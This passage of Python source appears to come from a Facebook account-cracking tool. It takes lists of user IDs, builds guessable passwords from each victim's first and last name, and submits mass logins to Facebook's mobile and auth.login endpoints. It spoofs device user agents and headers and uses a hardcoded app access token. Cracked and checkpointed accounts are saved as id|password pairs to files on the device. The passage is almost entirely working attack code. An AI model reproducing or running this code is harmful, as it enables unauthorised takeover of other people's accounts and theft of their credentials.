                        head = {'Host': 'm.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform':'"Android"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
                        getlog = session.get(f'https://free.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
                        idpass ={"lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://mbasic.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
                        complete = session.post('https://free.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
                        AWM=session.cookies.get_dict().keys()
                        if "c_user" in AWM:
                                coki=session.cookies.get_dict()
                                kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                print('\r\r\033[1;32m [M_TECH-OK] %s | %s'%(ids,pas))
                                open('/sdcard/M_TECH-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in AWM:
                                if 'y' in pcp:
                                        print('\r\r\x1b[38;5;208m [M_TECH-CP] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/M_TECH-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
                        else:
                                continue
        except requests.exceptions.ConnectionError:
                time.sleep(20)
        loop+=1
def api(ids,names,passlist):
                try:
                        global ok,loop
                        sys.stdout.write('\r\r\033[1;37m [WAHID-F2] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
                                ln = fn
                        for pw in passlist:
                                pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                                application_version = str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77))
                                application_version_code=str(random.randint(000000000,999999999))
                                fbs=random.choice(fbks)
                                gtt=random.choice(awminfinix)
                                accessToken="350685531728|62f8ce9f74b12f84c123cc23437a4a32"
                                awmsim = random.choice(awmsim1)
                                session = requests.Session()
                                ua = f'[FBAN/FB4A;FBAV/{application_version};FBBV/{application_version_code};FBDM/'+'{density=3.75,width=1080,height=2400};FBLC/en_NZ;FBRV/str(random.randint(000000000 ,999999999));FBCR/Etisalat Af;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/CPH2209;FBSV/10;FBOP/19;FBCA/armeabi-v7a:armeabi;]'
                                device_id = str(uuid.uuid4())
                                adid = str(uuid.uuid4())
                                data = {
 
                                'adid':adid,
 
                                'format':'json',
 
                                'device_id':device_id,
 
                                'email':ids,
 
                                'password':pas,
 
                                'generate_analytics_claims':'1',
 
                                'credentials_type':'password',
 
                                'source':'login',
 
                                'error_detail_type':'button_with_disabled',
 
                                'enroll_misauth':'false',
 
                                'generate_session_cookies':'1',
 
                                'generate_machine_id':'1',
 
                                'fb_api_req_friendly_name':'authenticate',
 
                        }
                                head ={
                    'x-fb-connection-quality':'EXCELLENT',
                    'x-fb-connection-type':'MOBILE.LTE',
                    'user-agent':ua,
                    'x-tigon-is-retry':'False',
                    'x-fb-http-engine':'Liger',
                    'x-fb-client-ip':'True',
                    'x-fb-server-cluster':'True',
                    'x-fb-device-group':str(random.randint(2000,4000)),
                    "X-FB-Connection-Bandwidth": str(random.randint(2000000.0,4000000.0)),
                    'x-fb-sim-hni':str(random.randint(2e4,4e4)),
                    'x-fb-net-hni':str(random.randint(2e4,4e4)),
                    'x-fb-rmd':'cached=0;state=NO_MATCH',
                    'x-fb-request-analytics-tags':'unknown',
                    'authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                    'content-type':'application/x-www-form-urlencoded',
                    'x-fb-friendly-name':'authenticate'
                }
                                url = 'https://b-api.facebook.com/method/auth.login'
                                po = requests.post(url,data=data,headers=head,allow_redirects=False).text
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\r\033[1;32m [WAHID-OK] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/WAHID-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                                elif 'www.facebook.com' in q['error_msg']:
                                        if 'y' in pcp:
                                                print('\r\r\x1b[38;5;208m [WAHID-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/WAHID-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                                else:
                                        continue
                        loop+=1
                except requests.exceptions.ConnectionError:
                        time.sleep(10)
                except Exception as e:
                        print(e)
def rndm2(ids,passlist):
                try:
                        global ok,loop
                        sys.stdout.write('\r\r\033[1;37m [WAHID-R] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        for pas in passlist:
                                application_version = str(random.randint(111,777))+'.0.0.'+str(random.randrange(11,77))+str(random.randint(111,777))
                                application_version_code=str(random.randint(000000000,999999999))
                                accessToken="350685531728|62f8ce9f74b12f84c123cc23437a4a32"
                                network = random.choice(['Zong','Etisalat Af','Telenor','Telekom China'])
                                MRDanishyar = f'[FBAN/FB4A;FBAV/{application_version};FBBV/{application_version_code};FBDM/'+'{density=3.0,width=1080,height=2360};FBLC/en_US;FBRV/str(random.randint(000000000 ,999999999));FBCR/Roshan;FBMF/INFINIX MOBILITY LIMITED;FBBD/Infinix;FBPN/com.facebook.katana;FBDV/Infinix x677;FBSV/8.1.0;FBBK/3;FBOP/19;FBCA/armeabi-v7a:armeabi;]'
                                device_id = str(uuid.uuid4())
                                adid = str(uuid.uuid4())
                                data = {
                                'adid':adid,
                                'format':'json',
                                'device_id':device_id,
                                'email':ids,
                                'password':pas,
                                'generate_analytics_claims':'1',
                                'credentials_type':'password',
                                'source':'login',
                                'error_detail_type':'button_with_disabled',
                                'enroll_misauth':'false',
                                'generate_session_cookies':'1',
                                'generate_machine_id':'1',
                                'fb_api_req_friendly_name':'authenticate',
 
                        }
                                head ={
                    'x-fb-connection-quality':'EXCELLENT',
                    'x-fb-connection-type':'MOBILE.LTE',
                    'user-agent':MRDanishyar,
                    "Connection": "Keep-Alive",
                    'x-tigon-is-retry':'False',
                    'x-fb-http-engine':'Liger',
                    'x-fb-client-ip':'True',
                    'x-fb-server-cluster':'True',
                    'x-fb-device-group':str(random.randint(2000,4000)),
                    "X-FB-Connection-Bandwidth": str(random.randint(2e7, 4e7)),
                    'x-fb-sim-hni':str(random.randint(20000,40000)),
                    'x-fb-net-hni':str(random.randint(20000,40000)),
                    'x-fb-rmd':'cached=0;state=NO_MATCH',
                    'x-fb-request-analytics-tags':'graphservice',
                    'authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                    'content-type':'application/x-www-form-urlencoded',
                    'x-fb-friendly-name':'authenticate'
                }
                                url = 'https://b-api.facebook.com/method/auth.login'
                                po = requests.post(url,data=data,headers=head,allow_redirects=False).text
                                q = json.loads(po)
                                if 'session_key' in q:
                                        uid=str(q['uid'])
                                        try:
                                                okk=open('/sdcard/WAHID-OK.txt','r').read()
                                                if uid in okk:pass
                                                else:
                                                        print('\r\r\033[1;32m [WAHID-OK] '+str(uid)+' | '+pas+'\033[1;90m')
                                                        open('/sdcard/WAHID-OK.txt','a').write(uid+'|'+pas+'\n')
                                                        oks.append(ids)
                                                        break
                                        except:
                                                print('\r\r\033[1;32m [WAHID-OK] '+uid+' | '+pas+'\033[1;97m')
                                                open('/sdcard/WAHID-OK.txt','a').write(uid+'|'+pas+'\n')
                                                oks.append(ids)
                                                break
                                else:
                                        continue
                        loop+=1
                except requests.exceptions.ConnectionError:
                        time.sleep(10)
                except Exception as e:
                        pass
 
try:
	menu()
except requests.exceptions.ConnectionError:
	print('No internet connection ...')
	exit()
except:exit()
 
 